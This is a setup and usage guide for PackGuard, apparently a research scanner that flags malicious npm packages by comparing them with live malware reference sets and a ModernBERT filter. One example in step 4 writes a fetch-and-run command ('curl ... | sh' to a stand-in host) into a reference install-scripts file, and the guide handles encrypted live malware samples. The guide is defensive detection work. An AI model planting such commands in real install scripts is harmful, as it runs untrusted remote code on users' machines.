# Running PackGuard from A to Z

This page goes from a clean checkout to a scored package in order: build the scanner, extract the
reference sets, build the Rust CLI, install stage 2, scan, and read the results. Every command is
run from the repository root unless a step says otherwise.

> **Malware safety.** The samples in `data/` are live malware. Extract and scan them only inside
> WSL or a virtual machine, never run `npm`, `node` or Windows Script Host on a sample, and never
> commit extracted files. On Windows, scan only benign code.

| Step | What you do | Needed for |
|---|---|---|
| 1 | Install the tools | everything |
| 2 | Clone the repository | everything |
| 3 | Build the stage 1 scanner | stage 1 |
| 4 | Extract the malware references | stage 1 |
| 5 | Prepare benign references (optional) | `--mode known` |
| 6 | Build the Rust CLI | CLI and TUI |
| 7 | Install the stage 2 model (optional) | `--stage2` |
| 8 | Prepare packages to scan | everything |
| 9 | Run a scan | |
| 10 | Read the results | |
| 11 | Run the tests | development |

## Fast path

For a first run on WSL or Linux with the v1 malware set and stage 2:

```bash
sudo apt update && sudo apt install -y build-essential pkg-config liblzma-dev curl unzip git python3-venv python3-pip
git clone https://github.com/fr9rx/PackGuard.git
cd PackGuard

make -j4
cd frontend && cargo build --release --locked && cd ..

mkdir -p ~/packguard-data/v1/malware_js
for z in data/v1/malware_js_*.zip; do
    unzip -q -P infected "$z" -d ~/packguard-data/v1/malware_js
done

bash "stage 2 LLM Model/v2/install_model.sh"

mkdir -p ~/samples/scan
# put one folder per package to scan in ~/samples/scan, named name@version

frontend/target/release/packguard-cli --mode known \
    --refs ~/packguard-data/v1/malware_js \
    --scan-dir ~/samples/scan \
    --packguard build/packguard \
    --stage2
```

The rest of this page explains each step and the alternatives. Add `--benign <dir>` to the last command
when you have a benign reference set (step 5); without it the known mode warns and raises more false
alarms.

## 1. Install the tools

| Tool | Version | Needed for |
|---|---|---|
| C compiler, GNU Make, pkg-config | C17 compiler (GCC 11+ / Clang 14+), Make 4.x | stage 1 |
| liblzma (xz) | 5.4.x or a recent 5.8.x, **never 5.6.0 or 5.6.1** | stage 1 |
| Rust toolchain | current stable (edition 2021) | CLI and TUI |
| Python | 3.10+ with `venv` (`python3-venv` on Debian/Ubuntu) | stage 2 and dataset scripts |
| Docker | any recent version, optional | container runs |
| zig 0.16+, CMake 3.20+, Make, optional | native Windows build |

Linux (Debian/Ubuntu) and WSL:

```bash
sudo apt update
sudo apt install -y build-essential pkg-config liblzma-dev curl unzip git python3-venv python3-pip
```

macOS:

```bash
xcode-select --install
brew install xz pkg-config
```

Rust, on any platform:

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

Check the liblzma version before building; 5.6.0 and 5.6.1 contain CVE-2024-3094:

```bash
xz --version
pkg-config --modversion liblzma
```

If your distribution ships 5.6.0 or 5.6.1, build 5.8.3 from source or use the Docker image.

## 2. Clone the repository

```bash
git clone https://github.com/fr9rx/PackGuard.git
cd PackGuard
```

The default branch is `main`. The release tags (`v6.0.0` and later) point at the same scanner generation.

## 3. Build the stage 1 scanner

Linux, macOS and WSL. The Makefile links liblzma statically, so the binary is self-contained:

```bash
make -j4
```

Windows PowerShell, which downloads xz 5.8.3, verifies its SHA-256 and builds `build\packguard.exe`:

```powershell
.\scripts\build-windows.ps1
```

Docker, which needs no local toolchain:

```bash
docker build -t packguard .
```

Check the build:

```bash
build/packguard -h            # build\packguard.exe -h on Windows
```

The C scanner only needs liblzma. ONNX Runtime is not linked into it yet: stage 2 runs in Python
(step 7) and the CLI pipes the reports to it.

## 4. Extract the malware references

The scanner compares every chunk against a reference directory shaped
`<group>/<package>@<version>/<file>`. The shipped v1 and v2 sets are encrypted zips; extract all 16
into one parent directory, inside WSL or a VM.

v1 (5,904 packages in 4,778 code-shape groups, about 708 MiB extracted):

```bash
mkdir -p ~/packguard-data/v1/malware_js
for z in data/v1/malware_js_*.zip; do
    unzip -q -P infected "$z" -d ~/packguard-data/v1/malware_js
done

find ~/packguard-data/v1/malware_js -mindepth 2 -maxdepth 2 -type d | wc -l   # 5,904 packages
find ~/packguard-data/v1/malware_js -mindepth 1 -maxdepth 1 -type d | wc -l   # 4,778 groups
```

v2 (6,500 packages, one per code shape, with `install_scripts.txt`):

```bash
mkdir -p ~/packguard-data/v2/malware_js
for z in data/v2/malware_js_*.zip; do
    unzip -q -P infected "$z" -d ~/packguard-data/v2/malware_js
done

find ~/packguard-data/v2/malware_js -mindepth 2 -maxdepth 2 -type d | wc -l   # 6,500 packages
find ~/packguard-data/v2/malware_js -mindepth 1 -maxdepth 1 -type d | wc -l   # 6,500 groups
```

Use one set per run; do not mix v1 and v2. The parent directory is the reference directory passed
as the first positional argument or with `--refs`.

You can also build a small custom set by hand:

```bash
mkdir -p refs/my-campaign/evil-pkg@1.0.0
cp samples/evil-pkg/index.js refs/my-campaign/evil-pkg@1.0.0/index.js
printf '%s\n' 'curl -s https://example.invalid/x | sh' \
    > refs/my-campaign/evil-pkg@1.0.0/install_scripts.txt
```

`my-campaign` is the group label. See [`folder-layout.md`](folder-layout.md) for the exact rules
and the shipped code-shape groups.

## 5. Prepare benign references (optional)

`--mode known` uses a benign reference set as a veto: a chunk only counts when it is closer to
malware than to benign code by a margin. Without it the mode still runs but warns and produces more
false alarms. `--mode new` does not use it at all.

Reproduce the v6 set used in the paper (5,211 packages, 171 MB of JavaScript):

```bash
python3 -I experiments/v6/scripts/fetch_benign_corpus.py   # raw tarballs -> ~/packguard-data/raw/npm
python3 -I experiments/v6/scripts/build_benign.py          # -> ~/packguard-data/v6/benign_refs
```

The first script expects the DataDog tree at `~/packguard-data/datadog` so it can exclude malicious
names; see [`dataset_index.md`](../dataset_index.md) for how that corpus was assembled. The second
writes a flat layout: `benign_refs/<name>@<version>/<file>`, with nested paths flattened with `__`.

For a quick hand-built set, unpack a few known-good npm tarballs:

```bash
mkdir -p benign_refs/left-pad@1.3.0
curl -fsSL https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz \
    | tar -xz --strip-components=1 -C benign_refs/left-pad@1.3.0
find benign_refs/left-pad@1.3.0 -name node_modules -prune -exec rm -rf {} +
```

Files must sit directly inside `<name>@<version>/`. Flatten any subfolder by replacing `/` with
`__`, for example `lib/pad.js` becomes `lib__pad.js`:

```bash
python3 - <<'PY'
import os
root = "benign_refs/left-pad@1.3.0"
for directory, _, files in os.walk(root, topdown=False):
    for name in files:
        source = os.path.join(directory, name)
        relative = os.path.relpath(source, root).replace(os.sep, "__")
        os.replace(source, os.path.join(root, relative))
PY
```

Pass the directory with `--benign` (CLI) or `-B` (scanner).

## 6. Build the Rust CLI

```bash
cd frontend
cargo build --release --locked
cd ..
```

The binary is `frontend/target/release/packguard-cli` (`packguard-cli.exe` on Windows). Check it:

```bash
frontend/target/release/packguard-cli --help
```

The CLI runs the C scanner, which must be on `PATH` as `packguard` (`packguard.exe` on Windows) or
passed with `--packguard build/packguard` (`build\packguard.exe` on Windows). It also parses the JSON
reports and runs stage 2 when `--stage2` is given.

## 7. Install the stage 2 model (optional)

Stage 2 is a fine-tuned ModernBERT exported to 8-bit ONNX. The installer creates a CPU-only virtual
environment (no GPU or PyTorch needed), downloads the 147 MB model bundle, checks it by running a
self-test, and leaves everything ready for the CLI.

Linux, WSL or macOS:

```bash
bash "stage 2 LLM Model/v2/install_model.sh"
```

Windows PowerShell:

```powershell
powershell -ExecutionPolicy Bypass -File "stage 2 LLM Model\v2\install_model.ps1"
```

Both leave these files in `stage 2 LLM Model/v2/`:

- `.venv-stage2/` with `onnxruntime`, `tokenizers`, `transformers` and `numpy`;
- `model_int8/packguard_modernbert_v2_int8.onnx`;
- `model_int8/tokenizer.json` and `model_int8/best_threshold.json`.

The self-test prints one line per sample and should end with `Self-test complete: 4/4 passed`. The
installer does not compare the download against a checksum: verify it yourself against the SHA-256 in
[`MODEL_DOWNLOAD.md`](../stage%202%20LLM%20Model/v2/MODEL_DOWNLOAD.md), which also has manual
download links for when the direct mirrors have expired. Extract the archive into `model_int8/`.

The CLI looks for `stage2_filter.py` in the repository and for `model_int8` next to it, then prefers
the `.venv-stage2` interpreter. Override any of that with `--stage2-script`, `--stage2-model` and
`--stage2-python`.

### Retraining (optional)

Stage 2 is trained on a GPU from the v6 benign manifests and the v2 malware zips.
`prepare_stage2_v2_data.py` builds the training and validation JSONL files, and
`continuous_train_v2.py` / `train_modernbert_v2.py` run the training rounds. The rounds, flags and
hardware timings are in the [`v2` README](../stage%202%20LLM%20Model/v2/README.md). Running stage 2
only needs the installer above, so skip this unless you are changing the model.

## 8. Prepare packages to scan

Each package path is one package root in its normal npm layout. Package and version in the report
come from the folder name, so name folders `name@version`.

```bash
mkdir -p ~/samples/scan
curl -fsSL https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz \
    | tar -xz --strip-components=1 -C ~/samples/scan/left-pad@1.3.0

mkdir -p ~/samples/scan/my-test-pkg@1.0.0
cp some-checked-out-package/index.js ~/samples/scan/my-test-pkg@1.0.0/
```

The scanner reads `.js`, `.cjs` and `.mjs` files below the path (skipping `node_modules`) and the
root `package.json` install hooks (`preinstall`, `install`, `postinstall`). Never run `npm install`
on a sample.

## 9. Run a scan

### With the CLI

New-campaign mode, no benign references:

```bash
frontend/target/release/packguard-cli --mode new \
    --refs ~/packguard-data/v1/malware_js \
    --scan-dir ~/samples/scan \
    --packguard build/packguard
```

Known-family mode with the benign veto:

```bash
frontend/target/release/packguard-cli --mode known \
    --refs ~/packguard-data/v1/malware_js \
    --benign ~/packguard-data/v6/benign_refs \
    --scan-dir ~/samples/scan \
    --packguard build/packguard
```

Same command with stage 2 chained, keeping the JSON reports:

```bash
frontend/target/release/packguard-cli --mode known \
    --refs ~/packguard-data/v1/malware_js \
    --benign ~/packguard-data/v6/benign_refs \
    --scan-dir ~/samples/scan \
    --packguard build/packguard \
    --reports ~/pg-reports \
    --stage2
```

Replace `--scan-dir` with `--package <dir>` (repeatable) to scan individual folders. Other useful
flags: `--threads N`, `--stage2-model <dir>`, `--stage2-python <path>`.

### With the C scanner

The scanner writes one JSON report per package with `-d`:

```bash
mkdir -p ~/pg-reports
build/packguard --mode known \
    -B ~/packguard-data/v6/benign_refs \
    -j 4 -d ~/pg-reports \
    ~/packguard-data/v1/malware_js ~/samples/scan/*
```

Use a glob of package folders, as above; passing a parent folder produces one report for the
parent, not one per package. Add `-o report.json` for a single report on stdout instead.

### With the TUI

```bash
frontend/target/release/packguard-cli --tui --packguard build/packguard
```

Set the mode, reference directories, scan directory, the stage 2 filter and its model directory in
the menu, then press `S` to scan and `R` to read the results.

### With Docker

```bash
docker build -t packguard .
docker run --rm --network none \
    -v "$PWD/refs:/refs:ro" \
    -v "$PWD/benign_refs:/benign:ro" \
    -v "$PWD/samples:/work:ro" \
    packguard --mode known -B /benign /refs /work/left-pad@1.3.0
```

`--network none` and read-only mounts keep samples isolated. The image contains stage 1 only.

## 10. Read the results

The CLI prints a ranked table, flagged packages first:

```
MODE known  threshold 0.70  packages 2
Stage 2 filter on (probability column, - = not flagged by stage 1)
PACKAGE                          VERSION             SCORE  PRIM     S2 FLAGGED HITS
------------------------------------------------------------------------------------------------------------
my-test-pkg                      1.0.0              0.4100     -  0.913     YES
left-pad                         1.3.0              0.8700     -      -      no

FLAGGED 1/2 (50.0%)   * = primitive rule fired
STAGE 1 flagged 1/2   STAGE 2 confirmed 1/1
```

- **SCORE** is the lowest NCD between the package and the malware references. Lower means more
  similar; `-` means the package had no JavaScript and no install scripts.
- **PRIM** is the behavioural primitive score of `--mode new`; `*` marks a primitive-only flag.
- **S2** is the stage 2 probability that the package is malicious. `-` means stage 1 did not flag
  it, so it was not sent to the model.
- **FLAGGED** is the final verdict. With `--stage2` it is stage 1 **and** stage 2.

The JSON reports keep every chunk:

```json
{
  "package": "my-test-pkg",
  "version": "1.0.0",
  "score": 0.41,
  "flagged": true,
  "stage2_prob": 0.913,
  "stage2_flagged": true,
  "chunks": [
    { "file": "index.js", "kind": "js", "start": 0, "ncd": 0.41, "text": "..." }
  ]
}
```

Report keys are documented in the main [`README.md`](../README.md#scanner-output-format). With
`--reports <dir>` the JSON files (including the stage 2 fields) stay on disk for further analysis.

Exit status is 0 on success, 1 if any package failed and 2 for a usage error.

### Choosing a mode

| | `--mode known` | `--mode new` |
|---|---|---|
| Use for | renamed or mangled copies of known malware | previously unseen campaigns |
| References | malware set plus benign set (`-B`) | malware set only |
| Thresholds | 0.70 raw, 0.65 normalised, 0.50 install scripts | 0.50 raw |
| Stage 1 measured | T1 97.5%, T2 94.2%, T3 94.2%, T4 96.7%, 2.2% benign flagged | 75.0% recall, 16.6% benign flagged (v5) |
| Stage 2 | filters the remaining false alarms | optional |

## 11. Run the tests

Rust CLI unit tests:

```bash
cd frontend
cargo test
cd ..
```

Scanner smoke checks:

```bash
build/packguard -h
build/packguard -j 2 refs/my-campaign tests/split_file_test/sample.txt   # custom set from step 4
```

Stage 2 self-test, which needs the installed model:

```bash
"stage 2 LLM Model/v2/.venv-stage2/bin/python" \
    "stage 2 LLM Model/v2/stage2_filter.py" --self-test
```

On Windows the interpreter is `stage 2 LLM Model\v2\.venv-stage2\Scripts\python.exe`.

Reference-set checks before a long run:

```bash
find ~/packguard-data/v1/malware_js -mindepth 2 -maxdepth 2 -type d | wc -l   # packages
find ~/packguard-data/v1/malware_js -type f -name package.json | wc -l        # must be 0
find ~/packguard-data/v6/benign_refs -mindepth 2 -type d | wc -l              # must be 0
```

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `pkg-config: command not found` or `liblzma` not found | development package missing | install `pkg-config liblzma-dev` / `brew install xz pkg-config` |
| Build refuses liblzma 5.6.0 or 5.6.1 | backdoored release | install another version or build 5.8.3 from source |
| Scanner loads 0 packages | reference path one level too high or too low | pass the parent that directly contains the group folders |
| `--mode known` warns about the benign veto | no `-B` / `--benign` | add a benign set or use `--mode new` |
| `cannot find stage2_filter.py` | CLI started outside the repository | pass `--stage2-script "stage 2 LLM Model/v2/stage2_filter.py"` |
| `No ONNX model found in ...` | model not installed | run the installer or pass `--stage2-model` |
| `ModuleNotFoundError: onnxruntime` or `tokenizers` | wrong interpreter | pass `--stage2-python <venv>/bin/python` (`Scripts\python.exe` on Windows) |
| `stage 2 exited with 1` | the filter printed a traceback | read the message after the exit code; it is the filter's stderr |
| Antivirus deletes samples or paths are too long | Windows limits | do all malware work inside WSL |
| `packguard produced no reports` | every target failed or no package folders matched | check the scanner's stderr and the folder names |
| `cargo: command not found` | Rust not installed | install it with rustup and open a new shell |

## Where to go next

- [`folder-layout.md`](folder-layout.md): the exact reference and scan tree, group names and checks.
- [`../dataset_index.md`](../dataset_index.md): where every dataset lives and how it was filtered.
- [`../experiments/v6/README.md`](../experiments/v6/README.md): the known mode's settings and results.
- [`../stage 2 LLM Model/v2/README.md`](../stage%202%20LLM%20Model/v2/README.md): stage 2 training,
  evaluation and the ONNX export.
- [`../frontend/README.md`](../frontend/README.md): the CLI and TUI reference.
